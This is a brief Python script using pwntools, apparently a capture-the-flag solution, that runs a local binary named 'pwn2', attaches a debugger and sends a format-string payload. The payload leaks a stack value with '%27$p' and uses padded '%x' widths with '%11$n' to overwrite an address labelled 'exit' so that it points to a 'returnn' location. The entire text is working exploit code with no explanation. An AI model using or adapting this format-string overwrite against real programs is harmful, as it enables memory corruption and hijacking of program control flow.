from pwn import *

io= process("./pwn2")

exit = 0x804b020
returnn = 0x080485EB
payload = "%27$p" + "%34283xaaaa%67588x"+ p32(exit) +"%11$n"
gdb.attach(io)
io.sendlineafter("input: ",payload)
io.interactive()
